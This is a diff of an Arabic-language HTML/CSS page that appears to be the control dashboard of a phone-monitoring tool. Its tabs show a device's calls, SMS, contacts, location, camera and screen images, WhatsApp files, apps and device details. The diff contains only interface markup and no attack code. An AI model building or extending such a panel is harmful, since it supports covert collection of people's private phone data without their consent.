@@ -22,7 +22,6 @@
 
     .container { max-width: 1500px; margin: 0 auto; display: flex; flex-direction: column; gap: 12px; }
 
-    /* الهيدر العلوي */
     header {
         background: var(--panel);
         border: 1px solid var(--green);
@@ -102,7 +101,6 @@
         font-weight: bold;
     }
 
-    /* شريط الحالة */
     .status-bar {
         background: var(--panel);
         border: 1px solid var(--border);
@@ -118,7 +116,6 @@
     .status-item .value { color: var(--green); font-weight: bold; }
     #networkStatus { color: var(--red); }
 
-    /* تخطيط لوحة التحكم الرئيسية */
     .dashboard-layout {
         display: flex;
         gap: 15px;
@@ -129,7 +126,6 @@
         .dashboard-layout { flex-direction: column-reverse; }
     }
 
-    /* منطقة عرض المحتوى (يسار) */
     .tab-content {
         flex: 1;
         background: var(--panel);
@@ -152,7 +148,6 @@
         padding-bottom: 8px;
     }
 
-    /* القائمة الجانبية (يمين) */
     .sidebar {
         width: 270px;
         background: var(--panel);
@@ -228,7 +223,6 @@
         font-size: 11px;
     }
 
-    /* الجداول والتصميمات الداخلية */
     table { width: 100%; border-collapse: collapse; font-size: 13px; }
     th, td { border-bottom: 1px solid var(--border); padding: 10px; text-align: right; }
     th { background: #050a08; color: var(--yellow); }
@@ -245,7 +239,6 @@
         margin-bottom: 12px;
     }
 
-    /* شبكة الصور */
     .images-grid {
         display: grid;
         grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
@@ -292,30 +285,16 @@
                 <div id="callsTab" class="tab-pane active">
                     <h3>📞 المكالمات</h3>
                     <div id="callsListView"></div>
-                    <div id="callDetailView" style="display:none;">
-                        <button onclick="backToCallsList()" class="back-btn">⬅️ رجوع</button>
-                        <h4 id="callDetailTitle"></h4>
-                        <div id="callDetailsList"></div>
-                    </div>
                 </div>
 
                 <div id="smsTab" class="tab-pane">
-                    <h3>💬 المحادثات</h3>
-                    <div id="conversationsList"></div>
-                    <div id="chatView" style="display:none;">
-                        <button onclick="backToConversations()" class="back-btn">⬅️ رجوع</button>
-                        <h4 id="chatTitle"></h4>
-                        <div id="messagesList" class="messages-list"></div>
-                    </div>
+                    <h3>💬 الرسائل القصيرة (SMS)</h3>
+                    <div id="smsListView"></div>
                 </div>
 
                 <div id="contactsTab" class="tab-pane">
                     <h3>👥 جهات الاتصال</h3>
                     <div id="contactsListView"></div>
-                    <div id="contactDetailView" style="display:none;">
-                        <button onclick="backToContactsList()" class="back-btn">⬅️ رجوع</button>
-                        <div id="contactDetails"></div>
-                    </div>
                 </div>
 
                 <div id="locationTab" class="tab-pane">
@@ -324,17 +303,12 @@
                 </div>
 
                 <div id="imagesTab" class="tab-pane">
-                    <h3>🖼️ الصور</h3>
+                    <h3>🖼️ الوسائط والصور (الكاميرا / الشاشة / واتساب)</h3>
                     <div id="imagesGrid" class="images-grid"></div>
                 </div>
 
-                <div id="deletedTab" class="tab-pane">
-                    <h3>🗑️ سلة المحذوفات</h3>
-                    <div id="deletedList"></div>
-                </div>
-
                 <div id="whatsappTab" class="tab-pane">
-                    <h3>💬 رسائل واتساب</h3>
+                    <h3>💬 ملفات واتساب</h3>
                     <div id="whatsappList"></div>
                 </div>
 
@@ -342,14 +316,14 @@
                     <h3>📱 التطبيقات</h3>
                     <table id="appsTable">
                         <thead>
-                            <tr><th>الاسم</th><th>الحزمة</th><th>نظام</th></tr>
+                            <tr><th>البيانات</th></tr>
                         </thead>
                         <tbody></tbody>
                     </table>
                 </div>
 
                 <div id="deviceTab" class="tab-pane">
-                    <h3>📊 الجهاز</h3>
+                    <h3>📊 معلومات الجهاز</h3>
                     <div id="deviceInfo"></div>
                 </div>
             </section>
@@ -369,7 +343,6 @@
                     <button class="tab" onclick="switchTab('calls')">📞 المكالمات <span id="callCount" class="count"></span></button>
                     <button class="tab" onclick="switchTab('apps')">📱 التطبيقات <span id="appsCount" class="count"></span></button>
                     <button class="tab" onclick="switchTab('whatsapp')">💬 واتساب <span id="whatsappCount" class="count"></span></button>
-                    <button class="tab" onclick="switchTab('deleted')">🗑️ المحذوفات <span id="deletedCount" class="count"></span></button>
                     <button class="tab" onclick="switchTab('location')">📍 الموقع</button>
                 </div>
             </aside>
